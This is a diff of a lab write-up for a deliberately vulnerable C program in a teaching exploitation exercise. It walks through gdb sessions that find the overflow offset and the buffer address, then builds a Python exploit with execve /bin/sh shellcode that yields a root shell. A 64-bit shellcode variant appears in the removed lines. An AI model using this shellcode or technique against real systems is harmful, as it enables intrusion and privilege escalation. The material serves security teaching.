@@ -4,11 +4,11 @@
 
 ## Goal
 
-## Preparation
+## Source
 
+File: `~/challenges/challenge11/challenge11.c`
 
-```
-$ cat vulnerable.c
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <crypt.h>
@@ -32,7 +32,6 @@ int checkPassword(char *password) {
 }
 
 
-
 void handleData(char *username, char *password) {
 	int isAdmin = 0;
 	char firstname[64];
@@ -48,7 +47,6 @@ void handleData(char *username, char *password) {
 }
 
 
-
 int main(int argc, char **argv) {
 	if (argc != 3) {
 		printf("Call: %s <name> <password>\n", argv[0]);
@@ -59,28 +57,82 @@ int main(int argc, char **argv) {
 }
 ```
 
-How to compile:
-
-```
-gcc -m32 -z execstack -fno-stack-protector vulnerable.c -o vulnerable -lcrypt
-```
-
-or `make vulnerable`
+You can compile it by calling `make` in the folder `~/challenges/challenge11`
 
 ## Analysis
 
 ```
-$ file vulnerable
+$ file challenge11
 vulnerable: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f6b1aab172bde7f561e30ef84f253da4a081d8d7, not stripped
 ```
 
-Find address of buffer using GDB
 
-Check disassembly of handleData in 64 bit binary:
+
+## Normal behaviour
+
+Run Programm with `AAAAAAAAAAA asdf` as parameter.
+
 ```
+root@hlUbuntu32:~/challenges/challenge11# gdb -q challenge11
+Reading symbols from challenge11...(no debugging symbols found)...done.
+(gdb) run AAAAAAAAAAA asdf
+Starting program: /root/challenges/challenge11/challenge11 AAAAAAAAAAA asdf
+Hello cmd-AAAAAAAAAAA.
+You are not admin.
+isAdmin: 0x0
+[Inferior 1 (process 454) exited normally]
+(gdb)
+```
+
+## Find offset
+
+Lets Crash program with 90 x "A" + 4 x "B".
+
+Re-run the programm with overlong arguments; you see some 0x4141 on the stack (Hex code for A). Nothing to see from B.
+
+```sh
+(gdb) run `python -c 'print "A" * 90 + "BBBB"'` test
+Starting program: /root/challenges/challenge11/challenge11 `python -c 'print "A" * 90 + "BBBB"'` test
+Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
+You are admin!
+isAdmin: 0x41414141
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+```
+
+Looks like it is crashing with EIP=0x41414141. But we want to have EIP=0x42424242. Lets remove
+some "A" bytes, and try again:
+
+Crash program with 76 x "A":
+```
+(gdb) run `python -c 'print "A" * 76 + "BBBB"'` test
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/challenges/challenge11/challenge11 `python -c 'print "A" * 76 + "BBBB"'` test
+Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
+You are admin!
+isAdmin: 0x41414141
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```
+
+Perfect, EIP is exactly 0x42424242. Therefore, the offset is 76 bytes.
+
+## Find buffer base address
+
+We need to find the address of the buffer where our shellcode is stored.
+This buffer is `argv[1]`, or `char *username` in the function `handleData()`.
+
+Therefore we can just break anywhere in `handleData()`, and print the address
+of the `username` parameter.
+
+Check disassembly of handleData:
+```sh
 root@hlUbuntu32aslr:~/challenges/challenge11# gdb -q vulnerable
 Reading symbols from vulnerable...(no debugging symbols found)...done.
-gdb-peda$ disas handleData
+(gdb) disas handleData
 Dump of assembler code for function handleData:
    0x080485bd <+0>:	push   ebp
    0x080485be <+1>:	mov    ebp,esp
@@ -121,138 +173,249 @@ Dump of assembler code for function handleData:
 End of assembler dump.
 ```
 
-Set Breakpoint in GDB: We want to break after the strcpy() finishes:
+Set Breakpoint in GDB. We can break anywhere in the function, lets say at
+`0x080485c3`
 ```
-(gdb) break *0x00000000004007b8
-Breakpoint 1 at 0x4007b8  
+(gdb) b *0x080485c3
+Breakpoint 1 at 0x080485c3
 ```
-Run Programm with AAAAAAAAAAA and asdf as parameter
 
-Lets start the program and see where the first parameter is stored. RDI will point to the destination:
+Run it with the parameter "AAAAAAAA test":
 
 ```
-(gdb) run AAAAAAAAAAA asdf
-Starting program: /home/hacker/7380/challenge3_64 AAAAAAAAAAA asdf
-
-Breakpoint 1, 0x00000000004007b8 in handleData ()
-(gdb) x/8x $rdi
-0x7fffffffe8c0:    0x41414141    0x41414141    0x00414141    0x00007fff
-0x7fffffffe8d0:    0xf780a1a8    0x00007fff    0xf7ff79b0    0x00007fff
-(gdb) i r rdi
-rdi            0x7fffffffe8c0    140737488349376
-```
-Crash program with 90 x "A"
-
-Re-run the programm with overlong arguments; you see some 0x4141 on the stack (Hex code for A) / nothing to see from B
-```
-(gdb) run `python -c 'print "A" * 90 + "BBBB"'` test
+(gdb) run AAAAAAAA test
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-Starting program: /home/hacker/7380/challenge3_64 `python -c 'print "A" * 90 + "BBBB"'` test
+Starting program: /root/challenges/challenge11/challenge11 AAAAAAAA test
 
-Breakpoint 1, 0x00000000004007b8 in handleData ()
-(gdb) c
-Continuing.
-You ARE admin!
-Be the force with you.
+Breakpoint 1, 0x080485c3 in handleData ()
 
-Program received signal SIGSEGV, Segmentation fault.
-0x0000424242424141 in ?? ()
+(gdb) x/1x $ebp+0x8
+0xffffd670:     0xffffd87e
+(gdb) x/4x 0xffffd87e
+0xffffd87e:     0x41414141      0x41414141      0x73657400      0x45540074
 ```
 
-Crash program with 88 x "A"
-```
-(gdb) run `python -c 'print "A" * 88 + "BBBB"'` test
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-Starting program: /home/hacker/7380/challenge3_64 `python -c 'print "A" * 88 + "BBBB"'` test
-
-Breakpoint 1, 0x00000000004007b8 in handleData ()
-(gdb) c
-Continuing.
-You ARE admin!
-Be the force with you.
-
-Program received signal SIGSEGV, Segmentation fault.
-0x0000000042424242 in ?? ()
-```
-Therefore, the offset is 88 bytes.
+The first parameter is stored at `EBP+0x8`. Or to be more specific, the address
+of the first parameter. This address is `0xffffd87e`. Then we can check if this
+address really points to our future shellcode.
 
 
-Create Exploit with Offset = 88
+## Create an exploit
 
-Shellcode spawns a shell
+The prepared exploit skeleton is available at the file `challenge11-exploit-skel.py`:
 ```
 #!/usr/bin/python
-
-/* exploit for challenge3.py */
-
-
+# Skeleton exploit for challenge11
 import sys
 
-shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 
 buf_size = 64
-offset = 88
+offset = ??
 
-ret_addr = "\xb0\xe8\xff\xff\xff\x7f"
+ret_addr = "\x??\x??\x??\x??"
 
-/* fill up to 64 bytes */
+# fill up to 64 bytes
 exploit = "\x90" * (buf_size - len(shellcode))
 exploit += shellcode
 
-/* garbage between buffer and RET */
+# garbage between buffer and RET
 exploit += "A" * (offset - len(exploit))
 
-/* add ret */
-exploit += ret_addr sys.stdout.write(exploit)
+# add ret
+exploit += ret_addr
+
+# print to stdout
+sys.stdout.write(exploit)
 ```
 
-Exploit in GDB
 
-Let's exploit the binary in GDB (within the debugger). Please use the "file ./challenge3_64" before running the binary!
+Lets insert the correct values:
+
 ```
-(gdb) file ./challenge3_64
-(gdb) run `python bof3.py` test
-test Starting program: /home/hacker/bfh/day2/challenge3 `python bof3-2.py` test
-You ARE admin!
-Be the force with you.
-isAdmin: 0x41414141
-process 13510 is executing new program: /bin/dash
-#  
+#!/usr/bin/python
+# Skeleton exploit for challenge11
+import sys
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+buf_size = 64
+offset = 76
+
+ret_addr = "\x36\xd8\xff\xff"
+
+# fill up to 64 bytes
+exploit = "\x90" * (buf_size - len(shellcode))
+exploit += shellcode
+
+# garbage between buffer and RET
+exploit += "A" * (offset - len(exploit))
+
+# add ret
+exploit += ret_addr
+
+# print to stdout
+sys.stdout.write(exploit)
 ```
 
-Exploit without GDB (directly)
 
-Let's now exploit the binary directly.
+## Test exploit
+
+
+Lets try our new exploit:
 ```
-# ./challenge3 `python bof3.py` test
-You ARE admin!
-Be the force with you.
-isAdmin: 0x41414141
+(gdb) run `python challenge11-exploit-skel.py` test
+Starting program: /root/challenges/challenge11/challenge11 `python challenge11-exploit-skel.py` test
+Hello cmd-...
+You are not admin.
+isAdmin: 0x80cd0bb0
+
+Program received signal SIGILL, Illegal instruction.
+0xffffd884 in ?? ()
+```
+
+Hmm, something went wrong. It seems that EIP does not point to valid assembler instructions.
+Lets confirm it:
+
+```
+(gdb) i r eip
+eip            0xffffd884       0xffffd884
+(gdb) x/8i 0xffffd884
+=> 0xffffd884:  (bad)
+   0xffffd885:  incl   (%eax)
+   0xffffd887:  je     0xffffd8ee
+   0xffffd889:  jae    0xffffd8ff
+   0xffffd88b:  add    %dl,0x52(%ebp,%eax,2)
+   0xffffd88f:  dec    %ebp
+   0xffffd890:  cmp    $0x72657478,%eax
+   0xffffd895:  insl   (%dx),%es:(%edi)
+```
+
+This does not look right. Lets check the position of our shellcode, `0xffffd87e`:
+```
+(gdb) x/4x 0xffffd87e
+0xffffd87e:     0x41414141      0xffffd87e      0x73657400      0x45540074
+```
+
+This is not our shellcode. Lets repeat step "Find buffer base address":
+
+```
+(gdb) b *0x080485c3
+Breakpoint 1 at 0x80485c3
+(gdb) run `python challenge11-exploit-skel.py` test
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/challenges/challenge11/challenge11 `python challenge11-exploit-skel.py` test
+
+Breakpoint 1, 0x080485c3 in handleData ()
+(gdb) x/1x $ebp+0x8
+0xffffd620:     0xffffd836
+(gdb) x/4x 0xffffd836
+0xffffd836:     0x90909090      0x90909090      0x90909090      0x90909090
+```
+
+It seems that now, our shellcode is located at address `0xffffd836`. Most likely
+because the shellcode is much longer than the original parameter, libc moved everything
+around a bit. Lets update our exploit yet again, and try it again.
+
+## Test exploit again
+
+Update the exploit:
+
+Replace:
+```
+ret_addr = "\x7e\xd8\xff\xff"
+```
+
+with:
+```
+ret_addr = "\x36\xd8\xff\xff"
+```
+
+Lets try again:
+```
+(gdb) run `python challenge11-exploit-skel.py` test
+Starting program: /root/challenges/challenge11/challenge11 `python challenge11-exploit-skel.py` test
+Hello cmd-...
+You are not admin.
+isAdmin: 0x80cd0bb0
+process 572 is executing new program: /bin/dash
 # id
 uid=0(root) gid=0(root) groups=0(root)
-#  
+#
 ```
 
-## Core Dump Analysis
+Success!
 
-In case the exploit is not working; find out the proper return address using core dumps
+
+## Test exploit without gdb
+
+Lets test it without gdb:
+
 ```
- ulimit -c unlimited
-./challenge3_64 `python bof3.py` test              (produces core file)
-gdb challenge3_64 core                                       (find out stack addresses using gdb)
-patch bof3.py with address out of core file
+root@hlUbuntu32:~/challenges/challenge11# ./challenge11 `python challenge11-exploit-skel.py` test
+Hello cmd-...
+You are not admin.
+isAdmin: 0x80cd0bb0
+Segmentation fault (core dumped)
 ```
 
-## Missions
-Try to implement the following things:
+Ouch, no shell. We have the analyze the core file.
 
-Create an exploit for the x32 version
-Can you create a reliable exploit which works in both GDB, and without GDB?
-Security Questions
-Please respond to the following security questions
+```
+root@hlUbuntu32:~/challenges/challenge11# ulimit -c unlimited
+root@hlUbuntu32:~/challenges/challenge11# ./challenge11 `python challenge11-exploit-skel.py` test
+Hello cmd-...
+You are not admin.
+isAdmin: 0x80cd0bb0
+Segmentation fault (core dumped)
+```
 
-How did you find the offset to SIP?
-How did you find the address of the shellcode?
-Could we use our exploit if ASLR would have been enabled? (echo 1 > /proc/sys/kernel/randomize_va_space)
+This will generate a corefile
+```
+root@hlUbuntu32:~/challenges/challenge11# gdb -q challenge11 core
+Reading symbols from challenge11...(no debugging symbols found)...done.
+[New LWP 14378]
+Core was generated by `./challenge11...
+Program terminated with signal SIGSEGV, Segmentation fault.
+#0  0xffffd836 in ?? ()
+(gdb) x/8x $eip
+0xffffd836:     0x00000000      0x00000000      0x68632f2e      0x656c6c61
+0xffffd846:     0x3165676e      0x90900031      0x90909090      0x90909090
+```
+
+We can simple look where EIP is pointing, and realize that the actual shellcode
+seems to be several bytes behind the current EIP (0x90909090).
+
+```
+(gdb) x/8x $eip+0x16
+0xffffd84c:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd85c:     0x90909090      0x90909090      0x90909090      0x90909090
+```
+
+Therefore, lets adjust the exploit once again:
+
+Replace:
+```
+ret_addr = "\x36\xd8\xff\xff"
+```
+
+with:
+```
+ret_addr = "\x4c\xd8\xff\xff"
+```
+
+```
+root@hlUbuntu32:~/challenges/challenge11# ./challenge11 `python challenge11-exploit-skel.py` test
+Hello cmd-...
+You are not admin.
+isAdmin: 0x80cd0bb0
+#
+```
+
+
+## Questions
+
+* Can you create an exploit which works with, and without GDB?
+* Can you create an exploit where the shellcode is stored in the variable password (argv[2])?
